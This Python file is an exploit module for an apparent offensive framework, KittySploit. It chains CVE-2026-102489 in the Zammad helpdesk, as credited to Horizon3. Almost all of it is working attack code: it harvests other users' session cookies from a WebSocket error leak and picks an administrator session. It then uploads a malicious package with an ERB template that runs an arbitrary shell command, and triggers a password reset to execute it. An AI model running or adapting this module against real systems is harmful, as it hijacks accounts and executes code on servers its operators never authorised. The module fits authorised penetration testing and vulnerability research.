#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-102489 — Zammad unauthenticated RCE via WebSocket @clients cookie leak (Horizon3 PoC).

Requires an authenticated user connected to /ws at exploit time. Writes command output to a
file on the target; does not create a KittySploit session.
Reference: https://github.com/horizon3ai/CVE-2026-102489
"""

from __future__ import annotations

import base64
import json
import re
import secrets
import threading
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Zammad WebSocket Session Leak RCE (CVE-2026-102489)",
        "description": (
            "Horizon3 chain for CVE-2026-102489: WebSocket event base triggers NoMethodError "
            "leaking connected users Cookie headers; hijacked session installs malicious ERB "
            "via packages API and triggers password-reset template evaluation. Blind file "
            "output on target (default /tmp/zammad_rce.txt)."
        ),
        "author": ["Horizon3 Attack Team", "KittySploit Team"],
        "cve": ["CVE-2026-102489"],
        "platform": Platform.LINUX,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-102489",
            "https://github.com/horizon3ai/CVE-2026-102489",
        ],
        "tags": ["zammad", "helpdesk", "websocket", "unauth", "auxiliary"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "credential_access"],
            "expected_requests": 8,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals", "credentials"],
            "requires": {"tech_hints_any": ["zammad"]},
            "chain": {
                "suggested_followups": [
                    "scanner/http/zammad_cve_2026_102489_detect",
                    "post/shell/linux/exploits/zammad_cve_2026_102490_lpe",
                ],
            },
        },
    }

    PACKAGE_NAME = "ZammadRceAddon"
    WS_WAIT_SECONDS = 10

    command = OptString("id", "Shell command to run on the Zammad host", required=False)
    out_file = OptString(
        "/tmp/zammad_rce.txt",
        "Remote file for command output",
        required=False,
        advanced=True,
    )
    ws_timeout = OptInteger(10, "Seconds to wait for WebSocket cookie harvest", required=False, advanced=True)
    cleanup = OptBool(True, "Remove malicious package after run", required=False, advanced=True)

    def _base_url(self) -> str:
        raw = str(getattr(self, "target", None) or getattr(self, "rhost", "") or "")
        if hasattr(raw, "value"):
            raw = raw.value
        raw = raw.strip()
        if raw.startswith("http://") or raw.startswith("https://"):
            return raw.rstrip("/")
        ssl_on = bool(self.ssl)
        proto = "https" if ssl_on else "http"
        host = raw.split("/")[0].split(":")[0]
        port = int(self.rport or self.port or (443 if ssl_on else 80))
        if (ssl_on and port == 443) or (not ssl_on and port == 80):
            return f"{proto}://{host}"
        return f"{proto}://{host}:{port}"

    def _ws_url(self) -> str:
        base = self._base_url()
        return base.replace("https://", "wss://", 1).replace("http://", "ws://", 1) + "/ws"

    def _cookie_name(self) -> str | None:
        r = self.http_request(method="GET", path="/", allow_redirects=False)
        if not r:
            return None
        for name in r.cookies.keys():
            if "_zammad_session" in name:
                return name
        header = r.headers.get("Set-Cookie", "")
        match = re.search(r"(_zammad_session\w*)", header)
        return match.group(1) if match else "_zammad_session"

    def _harvest_session_cookies(self, ws_url: str, cookie_name: str) -> list[str]:
        try:
            import websocket
        except ImportError:
            raise RuntimeError("Install websocket-client: pip install websocket-client")

        found: list[str] = []
        done = threading.Event()

        def on_open(ws):
            ws.send(json.dumps({"event": "base"}))

        def on_message(_ws, msg):
            try:
                frames = json.loads(msg)
            except json.JSONDecodeError:
                return
            if not isinstance(frames, list):
                frames = [frames]
            for frame in frames:
                if frame.get("event") != "error":
                    continue
                error = frame.get("data", {}).get("error", "")
                for raw in re.findall(r'"Cookie"=>"([^"]+)"', error):
                    match = re.search(re.escape(cookie_name) + r"=([a-f0-9]{20,})", raw)
                    if match and match.group(1) not in found:
                        found.append(match.group(1))
                _ws.close()
                done.set()

        def on_error(_ws, _err):
            done.set()

        def on_close(_ws, *_args):
            done.set()

        app = websocket.WebSocketApp(
            ws_url,
            header=[f"Cookie: {cookie_name}=attacker-{secrets.token_hex(8)}"],
            on_open=on_open,
            on_message=on_message,
            on_error=on_error,
            on_close=on_close,
        )
        thread = threading.Thread(target=app.run_forever, daemon=True)
        thread.start()
        done.wait(timeout=int(self.ws_timeout or self.WS_WAIT_SECONDS))
        try:
            app.close()
        except Exception:
            pass
        return found

    def _pick_session(self, cookie_name: str, cookies: list[str]) -> tuple[str, str, list] | None:
        for val in cookies:
            r = self.http_request(
                method="GET",
                path="/api/v1/users/me",
                headers={"Cookie": f"{cookie_name}={val}"},
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body, err = parse_json_response(r)
            if err or not isinstance(body, dict):
                continue
            login = str(body.get("login") or "")
            role_ids = body.get("role_ids") or []
            return val, login, role_ids
        return None

    def _csrf_for_session(self, cookie_name: str, cookie_val: str) -> str:
        r = self.http_request(
            method="GET",
            path="/",
            headers={"Cookie": f"{cookie_name}={cookie_val}"},
            allow_redirects=False,
        )
        return (r.headers.get("CSRF-TOKEN") or "") if r else ""

    def _install_malicious_package(
        self,
        cookie_name: str,
        cookie_val: str,
        csrf: str,
        command: str,
        out_path: str,
    ) -> bool:
        payload = f"<%= ::File.write('{out_path}', `{command}`) %>"
        template = (
            "Reset your #{config.product_name} password\n"
            "<div>Hi #{user.firstname},</div>\n"
            f"{payload}\n"
        )
        package = {
            "name": self.PACKAGE_NAME,
            "version": "1.0.0",
            "vendor": "PoC",
            "url": "https://example.com",
            "license": "MIT",
            "description": "PoC",
            "files": [
                {
                    "location": "app/views/mailer/password_reset/en.html.erb.custom",
                    "permission": "644",
                    "content": base64.b64encode(template.encode()).decode(),
                }
            ],
        }
        r = self.http_request(
            method="POST",
            path="/api/v1/packages",
            files={"file_upload": ("rce.zpm", json.dumps(package).encode(), "application/json")},
            headers={"X-CSRF-Token": csrf, "Cookie": f"{cookie_name}={cookie_val}"},
            allow_redirects=False,
        )
        if r and r.status_code in (200, 201):
            return True
        listing = self.http_request(
            method="GET",
            path="/api/v1/packages",
            headers={"Cookie": f"{cookie_name}={cookie_val}"},
            allow_redirects=False,
        )
        body, _ = parse_json_response(listing) if listing else (None, "")
        pkg_list = body if isinstance(body, list) else (body or {}).get("packages", [])
        return any(p.get("name") == self.PACKAGE_NAME for p in pkg_list if isinstance(p, dict))

    def _trigger_password_reset(self, login: str) -> None:
        r0 = self.http_request(method="GET", path="/", allow_redirects=False)
        csrf = r0.headers.get("CSRF-TOKEN", "") if r0 else ""
        self.http_request(
            method="POST",
            path="/api/v1/users/password_reset",
            json={"username": login},
            headers={"Content-Type": "application/json", "X-CSRF-Token": csrf},
            allow_redirects=False,
        )

    def _remove_package(self, cookie_name: str, cookie_val: str, csrf: str) -> None:
        listing = self.http_request(
            method="GET",
            path="/api/v1/packages",
            headers={"Cookie": f"{cookie_name}={cookie_val}"},
            allow_redirects=False,
        )
        body, _ = parse_json_response(listing) if listing else (None, "")
        pkg_list = body if isinstance(body, list) else (body or {}).get("packages", [])
        for pkg in pkg_list:
            if not isinstance(pkg, dict) or pkg.get("name") != self.PACKAGE_NAME:
                continue
            pkg_id = pkg.get("id")
            if pkg_id is None:
                continue
            self.http_request(
                method="DELETE",
                path=f"/api/v1/packages/{pkg_id}",
                headers={"X-CSRF-Token": csrf, "Cookie": f"{cookie_name}={cookie_val}"},
                allow_redirects=False,
            )

    def check(self) -> bool:
        r = self.http_request(method="GET", path="/api/v1/monitoring_health", allow_redirects=False)
        if r and r.status_code == 200:
            return True
        r2 = self.http_request(method="GET", path="/", allow_redirects=False)
        if r2 and "zammad" in f"{r2.text or ''}".lower():
            return True
        return False

    def run(self):
        url = self._base_url()
        if not url:
            print_error("Set target URL (ssl/path/rhost)")
            return False

        print_status("CVE-2026-102489 — Zammad WebSocket session leak (Horizon3)")
        if not self.check():
            print_error("Target does not look like Zammad")
            return False

        cookie_name = self._cookie_name()
        if not cookie_name:
            print_error("Could not determine _zammad_session cookie name")
            return False

        print_status(f"Harvesting cookies via WebSocket ({self._ws_url()})")
        try:
            cookies = self._harvest_session_cookies(self._ws_url(), cookie_name)
        except RuntimeError as exc:
            print_error(str(exc))
            return False

        if not cookies:
            print_error(
                "No session cookies captured — an authenticated user must be connected to /ws"
            )
            return False
        print_success(f"Captured {len(cookies)} session cookie(s)")

        session_val = None
        session_user = None
        role_ids: list = []
        for val in cookies:
            picked = self._pick_session(cookie_name, [val])
            if not picked:
                continue
            s_val, login, rids = picked
            if session_val is None or 1 in rids:
                session_val, session_user, role_ids = s_val, login, rids

        if not session_val or not session_user:
            print_error("No captured session validated via /api/v1/users/me")
            return False
        print_success(f"Using session for user {session_user!r} (roles={role_ids})")

        csrf = self._csrf_for_session(cookie_name, session_val)
        cmd = str(self.command or "id").strip()
        out_path = str(self.out_file or "/tmp/zammad_rce.txt").strip()

        print_status("Installing malicious package (ERB template)")
        if not self._install_malicious_package(cookie_name, session_val, csrf, cmd, out_path):
            print_error("Package installation failed")
            return False

        print_status("Triggering password reset to evaluate template")
        self._trigger_password_reset(session_user)
        time.sleep(6)

        print_success(f"Chain complete — check {out_path} on the target host for output")
        if self.cleanup:
            print_status("Removing package")
            self._remove_package(cookie_name, session_val, csrf)
        return True
